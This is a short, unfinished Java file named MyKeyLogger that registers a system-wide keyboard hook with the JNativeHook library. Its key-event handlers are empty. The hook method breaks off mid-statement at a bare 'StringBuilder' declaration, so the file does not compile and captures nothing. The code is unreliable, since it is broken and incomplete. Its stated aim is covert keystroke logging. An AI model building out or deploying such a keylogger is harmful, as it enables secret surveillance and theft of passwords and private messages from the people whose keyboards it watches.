package dev.haemanth;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedReader;
import java.io.PrintWriter;

public class MyKeyLogger implements NativeKeyListener {

    public static void main(String[] args){

        try{
            GlobalScreen.registerNativeHook();

        }catch(NativeHookException e){
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new MyKeyLogger());
    }


    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
    private static void hook(String key){
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder
    }
}
